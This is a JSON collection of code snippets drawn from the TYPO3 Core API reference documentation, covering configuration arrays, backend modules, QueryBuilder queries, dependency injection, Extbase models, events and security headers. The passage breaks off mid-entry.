[
  {
    "owner": "typo3-documentation",
    "repo": "typo3cms-reference-coreapi",
    "content": "TITLE: Returning Global Configuration Array in TYPO3 Settings\nDESCRIPTION: This PHP snippet returns a multi-dimensional array that defines the global configuration settings for the TYPO3 backend, front-end, database connections, and other functionalities important for TYPO3 operation. It details parameters such as debug settings, database credentials, and extension configurations. This array structure allows TYPO3 to manage settings effectively while providing a clear organization of different configuration categories.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nreturn [\n   'BE' => [\n      'debug' => true,\n      'explicitADmode' => 'explicitAllow',\n      'installToolPassword' => '$P$Cbp90UttdtIKELNrDGjy4tDxh3uu9D/',\n      'loginSecurityLevel' => 'normal',\n   ],\n   'DB' => [\n      'Connections' => [\n         'Default' => [\n            'charset' => 'utf8',\n            'dbname' => 'empty_typo3',\n            'driver' => 'mysqli',\n            'host' => '127.0.0.1',\n            'password' => 'foo',\n            'port' => 3306,\n            'user' => 'bar',\n         ],\n      ],\n   ],\n   'EXTCONF' => [\n       'lang' => [\n           'availableLanguages' => [\n               'de',\n               'eo',\n           ],\n       ],\n   ],\n   'EXTENSIONS' => [\n       'backend' => [\n           'backendFavicon' => '',\n           'backendLogo' => '',\n           'loginBackgroundImage' => '',\n           'loginFootnote' => '',\n           'loginHighlightColor' => '',\n           'loginLogo' => '',\n       ],\n       'extensionmanager' => [\n           'automaticInstallation' => '1',\n           'offlineMode' => '0',\n       ],\n       'scheduler' => [\n           'maxLifetime' => '1440',\n           'showSampleTasks' => '1',\n       ],\n   ],\n   'FE' => [\n      'debug' => true,\n      'loginSecurityLevel' => 'normal',\n   ],\n   'GFX' => [\n      'jpg_quality' => '80',\n   ],\n   'MAIL' => [\n      'transport_sendmail_command' => '/usr/sbin/sendmail -t -i ',\n   ],\n   'SYS' => [\n      'devIPmask' => '*',\n      'displayErrors' => 1,\n      'encryptionKey' => '0396e1b6b53bf48b0bfed9e97a62744158452dfb9b9909fe32d4b7a709816c9b4e94dcd69c011f989d322cb22309f2f2',\n      'exceptionalErrors' => 28674,\n      'sitename' => 'New TYPO3 site',\n   ],\n];\n```\n\n----------------------------------------\n\nTITLE: Defining Backend Module Configuration in TYPO3 PHP\nDESCRIPTION: This snippet specifies the configuration for backend modules within the TYPO3 extension. It is essential for setting up and managing custom backend functionalities and interfaces. The primary dependency is the TYPO3 CMS framework that supports backend modules. The inputs include various module definitions, while the outputs are module configurations that dictate their behavior in the backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/Backend/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n..  typo3:file:: Modules.php\n    :scope: extension\n    :path: /Configuration/Backend/\n    :regex: /^.*Configuration\\/Backend\\/Modules\\.php$/\n    :shortDescription: Defines the backend module configuration\n\n    This file is used for the\n    :ref:`Backend module configuration <backend-modules-configuration>`. See that\n    chapter for details.\n```\n\n----------------------------------------\n\nTITLE: Basic PHP File Structure\nDESCRIPTION: Demonstrates the basic structure of a PHP file within the TYPO3 CMS, including the full opening PHP tag, strict type declaration, and the absence of a closing PHP tag.  Strict type declarations are mandatory for all new PHP files in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/GeneralRequirementsForPhpFiles.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types = 1);\n// File content goes here\n```\n\n----------------------------------------\n\nTITLE: Dynamic URL Parts in TYPO3 Backend Routes\nDESCRIPTION: Example showing how to define dynamic segments in backend route paths using named placeholders. These dynamic parts are later accessible as request attributes in the controller.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendRouting.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nreturn [\n    'myroute' => [\n        'path' => '/myroute/{uid}',\n        'target' => \\Vendor\\MyExtension\\Controller\\MyRouteController::class . '::mainAction',\n    ],\n];\n\n```\n\n----------------------------------------\n\nTITLE: Inserting a Row into tt_content Table in TYPO3\nDESCRIPTION: Demonstrates inserting a single row into the tt_content table using the TYPO3 Connection API. Shows dependency injection of ConnectionPool and basic insert operation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/BasicCrud/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nINSERT INTO `tt_content` (`pid`, `bodytext`) VALUES ('42', 'ipsum')\n```\n\n----------------------------------------\n\nTITLE: COUNT Query with TYPO3 Query Builder\nDESCRIPTION: Example of creating and executing a COUNT query to get the number of records matching specific criteria.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n// SELECT COUNT(`uid`) FROM `tt_content` WHERE (`bodytext` = 'lorem')\n//     AND ((`tt_content`.`deleted` = 0) AND (`tt_content`.`hidden` = 0)\n//     AND (`tt_content`.`starttime` <= 1669885410)\n//     AND ((`tt_content`.`endtime` = 0) OR (`tt_content`.`endtime` > 1669885410)))\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$count = $queryBuilder\n    ->count('uid')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq('bodytext', $queryBuilder->createNamedParameter('lorem', Connection::PARAM_STR))\n    )\n    ->executeQuery()\n    ->fetchOne();\n```\n\n----------------------------------------\n\nTITLE: Apache Content Security Policy Configuration for Fileadmin\nDESCRIPTION: Apache configuration to set strict Content Security Policy headers for files in the fileadmin directory, preventing script execution and external resource loading\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/ContentSecurityPolicy.rst#2025-04-16_snippet_0\n\nLANGUAGE: apacheconf\nCODE:\n```\n# placed in fileadmin/.htaccess on Apache 2.x webserver\n<IfModule mod_headers.c>\n    Header set Content-Security-Policy \"default-src 'self'; script-src 'none'; style-src 'none'; object-src 'none';\"\n</IfModule>\n```\n\n----------------------------------------\n\nTITLE: Ensuring Integrity of External JavaScript in TypoScript\nDESCRIPTION: This snippet demonstrates how to use the integrity property in TypoScript to specify an SRI hash for an external JavaScript file, ensuring its integrity.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/Typoscript.rst#2025-04-16_snippet_3\n\nLANGUAGE: typoscript\nCODE:\n```\npage {\n  includeJS {\n    jQuery = https://code.jquery.com/jquery-1.11.3.min.js\n    jQuery.external = 1\n    jQuery.disableCompression = 1\n    jQuery.excludeFromConcatenation = 1\n    jQuery.integrity = sha256-7LkWEzqTdpEfELxcZZlS6wAx5Ff13zZ83lYO2/ujj7g=\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring BE/FE Authentication Behavior in TYPO3\nDESCRIPTION: Configuration settings to force authentication checks on every request for both backend and frontend users. This is useful for scenarios requiring continuous validation like IP-based authentication.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/AuthenticationService/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF']['auth']['setup']['BE_alwaysFetchUser'] = true;\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF']['auth']['setup']['BE_alwaysAuthUser'] = true;\n\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF']['auth']['setup']['FE_alwaysFetchUser'] = true;\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF']['auth']['setup']['FE_alwaysAuthUser'] = true;\n```\n\n----------------------------------------\n\nTITLE: Applying TypoScript Settings to FileUpload Configuration\nDESCRIPTION: Example showing how to use TypoScript configuration values for file upload settings in an Extbase controller. This demonstrates applying a configurable upload folder from TypoScript settings with a fallback option.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FileUpload.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\npublic function initializeCreateAction(): void\n{\n    $argument = $this->arguments->getArgument('myArgument');\n    $configuration = $argument->getFileHandlingServiceConfiguration()->getConfigurationForProperty('file');\n    $configuration?->setUploadFolder($this->settings['uploadFolder'] ?? '1:/fallback_folder');\n}\n```\n\n----------------------------------------\n\nTITLE: Protecting Against SQL Injection with createNamedParameter() in TYPO3\nDESCRIPTION: Illustrates the importance of using createNamedParameter() to protect against SQL injection when dealing with user input in database queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_28\n\nLANGUAGE: PHP\nCODE:\n```\n// SELECT * FROM `tt_content` WHERE (`bodytext` = 'kl\\'aus')\n$searchWord = \"kl'aus\"; // $searchWord retrieved from the PSR-7 request\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder->getRestrictions()->removeAll();\n$queryBuilder\n    ->select('uid')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq(\n            'bodytext',\n            $queryBuilder->createNamedParameter($searchWord, Connection::PARAM_STR)\n        )\n    )\n    ->executeQuery();\n```\n\n----------------------------------------\n\nTITLE: Mocking Dependencies in TYPO3 Unit Tests\nDESCRIPTION: Demonstrates how to mock dependencies and create test instances with specific mocked objects in a TYPO3 unit test environment.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nclass FormInlineAjaxControllerTest extends \\TYPO3\\TestingFramework\\Core\\Unit\\UnitTestCase {\n    /**\n     * @test\n     */\n    public function someMethodWithMockedDependency() {\n        $mockDependency = $this->createMock(SomeDependencyClass::class);\n        $mockDependency->expects(self::once())->method('someMethod');\n        \n        $systemUnderTest = new FormInlineAjaxController();\n        $systemUnderTest->methodUnderTest($mockDependency);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Extbase Plugin with Allowed Controllers\nDESCRIPTION: This code snippet shows how to configure an Extbase plugin in `ext_localconf.php` to allow forwarding between specific controllers. It uses `ExtensionUtility::configurePlugin()` to register the plugin and define the allowed controllers and actions. This configuration is essential for the `ForwardResponse` to function correctly.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/ActionController.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nuse TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility;\n\nExtensionUtility::configurePlugin(\n    'BlogExample',\n    'Pi1',\n    [\n        \\Vendor\\Extension\\Controller\\PostController::class => 'index',\n        \\Vendor\\Extension\\Controller\\CommentController::class => 'index',\n    ],\n    // non-cacheable actions\n    []\n);\n```\n\n----------------------------------------\n\nTITLE: Table Definition Example - SQL\nDESCRIPTION: An example SQL statement demonstrating how a TYPO3 database table can be defined in the ext_tables.sql file. This definition can be partial, meaning it may only include specific fields while TYPO3 merges it with existing definitions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtTablesSql.rst#2025-04-16_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE tx_myextension_domain_model_table (\n);\n\n```\n\n----------------------------------------\n\nTITLE: Using Interface Injection in TYPO3 Extension Service\nDESCRIPTION: A PHP class demonstrating how to use dependency injection with the PSR-20 clock interface in a TYPO3 extension service, allowing for better testability by injecting the interface rather than a concrete implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_15\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Service;\n\nuse Psr\\Clock\\ClockInterface;\n\nfinal readonly class MyService\n{\n    public function __construct(\n        private ClockInterface $clock,\n    ) {\n    }\n\n    public function doSomething(): \\DateTimeImmutable\n    {\n        // Use the injected clock interface\n        return $this->clock->now();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Service Using Extension Configuration Injection in TYPO3\nDESCRIPTION: Example of a service using extension configuration injection via autowiring.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_13\n\nLANGUAGE: php\nCODE:\n```\nclass MyServiceGettingExtensionConfigurationValueInjected {\n    public function __construct(\n        #[Autowire(service: 'my_extension.configuration')]\n        private readonly CoreExtensionConfiguration $configuration\n    ) {}\n}\n```\n\n----------------------------------------\n\nTITLE: Constructor Injection in TYPO3 Controller (PHP)\nDESCRIPTION: Demonstrates constructor injection for a UserController that depends on a UserRepository service. The UserRepository is automatically injected by the framework when the controller is instantiated.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse MyVendor\\MyExtension\\Domain\\Repository\\UserRepository;\n\nclass UserController\n{\n    public function __construct(\n        private readonly UserRepository $userRepository\n    ) {\n    }\n\n    public function listAction(): void\n    {\n        $users = $this->userRepository->findAll();\n        // ...\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Sending Email with FluidEmail in PHP\nDESCRIPTION: Demonstrates how to create and send an email using the FluidEmail class, including setting recipients, subject, and assigning template variables.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\nuse Symfony\\Component\\Mime\\Address;\nuse TYPO3\\CMS\\Core\\Mail\\FluidEmail;\nuse TYPO3\\CMS\\Core\\Mail\\MailerInterface;\n\n$email = new FluidEmail();\n$email\n    ->to('contact@example.org')\n    ->from(new Address('jeremy@example.org', 'Jeremy'))\n    ->subject('TYPO3 loves you - here is why')\n    ->format(FluidEmail::FORMAT_BOTH) // send HTML and plaintext mail\n    ->setTemplate('TipsAndTricks')\n    ->assign('mySecretIngredient', 'Tomato and TypoScript');\nGeneralUtility::makeInstance(MailerInterface::class)->send($email);\n```\n\n----------------------------------------\n\nTITLE: Implementing Many-to-Many Relationship in Extbase Model\nDESCRIPTION: This code demonstrates how to implement a m:n relationship between Post and Category models in Extbase, with proper ObjectStorage initialization and manipulation methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Model.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n/**\n * The categories this post is assigned to\n *\n * @var \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Category>\n * @TYPO3\\CMS\\Extbase\\Annotation\\ORM\\Lazy\n */\nprotected $categories = null;\n\n/**\n * Initializes all ObjectStorage properties when model is constructed\n */\npublic function __construct()\n{\n    $this->categories = new \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage();\n}\n\n/**\n * Get the categories this post is assigned to\n *\n * @return \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Category>\n */\npublic function getCategories()\n{\n    return $this->categories;\n}\n\n/**\n * Set the categories this post is assigned to\n *\n * @param \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Category> $categories\n */\npublic function setCategories(\\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage $categories)\n{\n    $this->categories = $categories;\n}\n\n/**\n * Add a category to this post\n *\n * @param \\MyVendor\\MyExtension\\Domain\\Model\\Category $category\n */\npublic function addCategory(\\MyVendor\\MyExtension\\Domain\\Model\\Category $category)\n{\n    $this->categories->attach($category);\n}\n\n/**\n * Remove a category from this post\n *\n * @param \\MyVendor\\MyExtension\\Domain\\Model\\Category $categoryToRemove\n */\npublic function removeCategory(\\MyVendor\\MyExtension\\Domain\\Model\\Category $categoryToRemove)\n{\n    $this->categories->detach($categoryToRemove);\n}\n```\n\n----------------------------------------\n\nTITLE: Checking a Password Against Stored Hash in TYPO3 Frontend\nDESCRIPTION: This code snippet shows how to check a plain-text password against a stored password hash for a TYPO3 frontend user. It uses the PasswordHashFactory to get the appropriate hashing instance and then compares the password with the stored hash.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PasswordHashing/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\PasswordHashFactory;\n// ...\n// Given plain-text password\n$password = 'someHopefullyGoodAndLongPassword';\n// The stored password hash from database\n$passwordHash = 'YYY';\n// The context, either 'FE' or 'BE'\n$mode = 'FE';\n$success = GeneralUtility::makeInstance(PasswordHashFactory::class)\n    ->get($passwordHash, $mode) # or getDefaultHashInstance($mode)\n    ->checkPassword($password, $passwordHash);\n```\n\n----------------------------------------\n\nTITLE: Utilizing DTO and AbstractEntity in Extbase Controller with PHP\nDESCRIPTION: This PHP code snippet provides an example of using Data Transfer Objects (DTO) alongside AbstractEntity within an Extbase controller. The DTOs act as pure data storage, facilitating the transfer of data between different layers in a CRUD setup. This approach allows for a clear separation of data and behavior, promoting modular and maintainable code.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/BestPractises/SoftwareDesignPrinciples.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\n..  literalinclude:: _dto.php\\n    :language: php\\n    :caption: Example of DTO and AbstractEntity used in an Extbase controller\\n\n```\n\n----------------------------------------\n\nTITLE: Releasing Event Listeners in TYPO3 JavaScript\nDESCRIPTION: Demonstrates how to remove an event listener when it's no longer needed using the release() method. This example shows the complete lifecycle of creating, attaching, and removing an event listener.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/JavaScript/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n// AnyEventStrategy is a placeholder, concrete implementations are handled in the following chapters\nconst event = new AnyEventStrategy('click', callbackFn);\nevent.delegateTo(document.getElementById('foobar'), '.any-class');\n\n// Release the event\nevent.release();\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Event Class in PHP for TYPO3\nDESCRIPTION: Defines a custom event class 'DoingThisAndThatEvent' with immutable and mutable properties, including getters and setters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/EventDispatcher/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\Event;\n\nfinal class DoingThisAndThatEvent\n{\n    public function __construct(\n        private readonly string $immutableProperty,\n        private string $mutableProperty\n    ) {\n    }\n\n    public function getImmutableProperty(): string\n    {\n        return $this->immutableProperty;\n    }\n\n    public function getMutableProperty(): string\n    {\n        return $this->mutableProperty;\n    }\n\n    public function setMutableProperty(string $mutableProperty): void\n    {\n        $this->mutableProperty = $mutableProperty;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Content Element Group in TSConfig\nDESCRIPTION: Shows how to remove an entire group of content elements from the New Content Element wizard using Page TSconfig.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/ContentElementsWizard.rst#2025-04-16_snippet_3\n\nLANGUAGE: TSConfig\nCODE:\n```\nmod.wizards.newContentElement.wizardItems {\n    special.header := removeFromList()\n    special.elements := removeFromList()\n    special.show := removeFromList()\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic DoSomethingCommand in PHP\nDESCRIPTION: Basic implementation of a TYPO3 console command class that extends Symfony\\Component\\Console\\Command\\Command, including configure() and execute() methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Tutorial.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace T3docs\\Examples\\Command;\n\nuse Symfony\\Component\\Console\\Command\\Command;\nuse Symfony\\Component\\Console\\Input\\InputInterface;\nuse Symfony\\Component\\Console\\Output\\OutputInterface;\n\nfinal class DoSomethingCommand extends Command\n{\n    /**\n     * Configure the command by defining the name, options and arguments\n     */\n    protected function configure(): void\n    {\n        $this->setHelp('Outputs nothing, but returns silently.');\n    }\n\n    /**\n     * Executes the command\n     */\n    protected function execute(InputInterface $input, OutputInterface $output): int\n    {\n        return Command::SUCCESS;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Dispatching Messages using MessageBusInterface in TYPO3\nDESCRIPTION: Example of how to inject the MessageBusInterface and dispatch a message. This demonstrates dependency injection and usage of the message bus in a TYPO3 class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension;\n\nuse MyVendor\\MyExtension\\Queue\\Message\\DemoMessage;\nuse Symfony\\Component\\Messenger\\MessageBusInterface;\n\nclass MyClass\n{\n    public function __construct(\n        protected readonly MessageBusInterface $messageBus\n    ) {\n    }\n\n    public function process(): void\n    {\n        // will hand over to the messenger system\n        $this->messageBus->dispatch(new DemoMessage('my payload'));\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Extbase Frontend Plugin as Content Element in PHP\nDESCRIPTION: The PHP code snippet demonstrates how to configure an Extbase frontend plugin as a content element using the `TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility::configurePlugin()` function. It specifies parameters such as extension key, plugin identifier, allowed controller-action combinations, and uncached actions. The configuration generates required TypoScript for the frontend display of the plugin.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FrontendPlugins.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\n\\TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility::configurePlugin(\n  'blog_example',\n  'PostSingle',\n  [\n    'Post' => 'show',\n    'Comment' => 'create'\n  ],\n  // Non-cacheable actions\n  [\n    'Comment' => 'create'\n  ]\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Database Connection in TYPO3\nDESCRIPTION: This snippet shows how to configure the default database connection in TYPO3's `settings.php` or `additional.php` file. It defines the driver, charset, database name, host, password, port, and user for the default database connection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/DB.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\"Connections\" => [\n    'Default' => [\n        'charset' => 'utf8mb4',\n        'driver' => 'mysqli',\n        'dbname' => 'typo3_database',\n        'host' => '127.0.0.1',\n        'password' => 'typo3',\n        'port' => 3306,\n        'user' => 'typo3',\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: Minimal composer.json Setup for TYPO3 Extension\nDESCRIPTION: This snippet represents a minimal setup for a composer.json file in a TYPO3 extension, specifying the vendor name 'MyVendor' and the extension key 'my_extension'. This configuration results in the PHP namespace 'MyVendor\\MyExtension' and the Composer package name 'my-vendor/my-extension'. This setup is required to ensure proper documentation and dependency management.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ComposerJson.rst#2025-04-16_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"my-vendor/my-extension\",\n    \"description\": \"1 line description\",\n    \"type\": \"typo3-cms-extension\",\n    \"license\": \"GPL-2.0-or-later\",\n    \"require\": {\n        \"typo3/cms-core\": \"^9.5\"\n    },\n    \"autoload\": {\n        \"psr-4\": {\n            \"MyVendor\\\\MyExtension\\\\\": \"Classes/\"\n        }\n    },\n    \"extra\": {\n        \"typo3/cms\": {\n            \"extension-key\": \"my_extension\"\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Link Builder in TYPO3 Extension Configuration\nDESCRIPTION: This snippet demonstrates how to register a custom link builder in a TYPO3 extension's ext_localconf.php file. The code uses the TYPO3 configuration API to add a new custom link builder for a specific link type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/LinkBuilder.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['FE']['typolinkBuilder']['mylink'] = \\Vendor\\MyExtension\\Typolink\\MyLinkBuilder::class;\n```\n\n----------------------------------------\n\nTITLE: Defining Backend Modules Configuration in TYPO3 CMS\nDESCRIPTION: This code demonstrates how to register and configure backend modules in TYPO3. It defines two modules: a web module accessible to regular users and an admin module accessible only to administrators. Each module configuration includes settings for parent module, position, access rights, workspaces, routing path, labels, icons, and controller actions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/_ModuleConfiguration/_Modules.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\n/*\n * This file is part of the TYPO3 CMS project.\n *\n * It is free software; you can redistribute it and/or modify it under\n * the terms of the GNU General Public License, either version 2\n * of the License, or any later version.\n *\n * For the full copyright and license information, please read the\n * LICENSE.txt file that was distributed with this source code.\n *\n * The TYPO3 project - inspiring people to share!\n */\n\nuse T3docs\\Examples\\Controller\\AdminModuleController;\nuse T3docs\\Examples\\Controller\\ModuleController;\n\n/**\n * Definitions for modules provided by EXT:examples\n */\nreturn [\n    'web_examples' => [\n        'parent' => 'web',\n        'position' => ['after' => 'web_info'],\n        'access' => 'user',\n        'workspaces' => 'live',\n        'path' => '/module/page/example',\n        'labels' => 'LLL:EXT:examples/Resources/Private/Language/Module/locallang_mod.xlf',\n        'extensionName' => 'Examples',\n        'iconIdentifier' => 'tx_examples-backend-module',\n        'controllerActions' => [\n            ModuleController::class => [\n                'flash', 'tree', 'clipboard', 'links', 'fileReference', 'fileReferenceCreate', 'count',\n            ],\n        ],\n    ],\n    'admin_examples' => [\n        'parent' => 'system',\n        'position' => ['top'],\n        'access' => 'admin',\n        'workspaces' => 'live',\n        'path' => '/module/system/example',\n        'labels' => 'LLL:EXT:examples/Resources/Private/Language/AdminModule/locallang_mod.xlf',\n        'iconIdentifier' => 'tx_examples-backend-module',\n        'routes' => [\n            '_default' => [\n                'target' => AdminModuleController::class . '::handleRequest',\n            ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Using where(), andWhere(), and orWhere() in QueryBuilder for TYPO3 CMS\nDESCRIPTION: Demonstrates how to use where(), andWhere(), and orWhere() methods in QueryBuilder to create complex WHERE clauses for SELECT, COUNT, UPDATE, and DELETE queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_16\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n// SELECT `uid`, `header`, `bodytext`\n// FROM `tt_content`\n// WHERE\n//    (\n//       ((`bodytext` = 'lorem') AND (`header` = 'a name'))\n//       OR (`bodytext` = 'dolor') OR (`bodytext` = 'hans')\n//    )\n//    AND (`pid` = 42)\n//    AND ... RestrictionBuilder TCA restrictions ...\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$result = $queryBuilder\n    ->select('uid', 'header', 'bodytext')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq('bodytext', $queryBuilder->createNamedParameter('lorem', Connection::PARAM_STR)),\n        $queryBuilder->expr()->eq('header', $queryBuilder->createNamedParameter('a name', Connection::PARAM_STR))\n    )\n    ->orWhere(\n        $queryBuilder->expr()->eq('bodytext', $queryBuilder->createNamedParameter('dolor')),\n        $queryBuilder->expr()->eq('bodytext', $queryBuilder->createNamedParameter('hans'))\n    )\n    ->andWhere(\n        $queryBuilder->expr()->eq('pid', $queryBuilder->createNamedParameter(42, Connection::PARAM_INT))\n    )\n    ->executeQuery();\n```\n\n----------------------------------------\n\nTITLE: Instantiating Query Builder in TYPO3 Repository\nDESCRIPTION: Shows how to properly instantiate a Query Builder 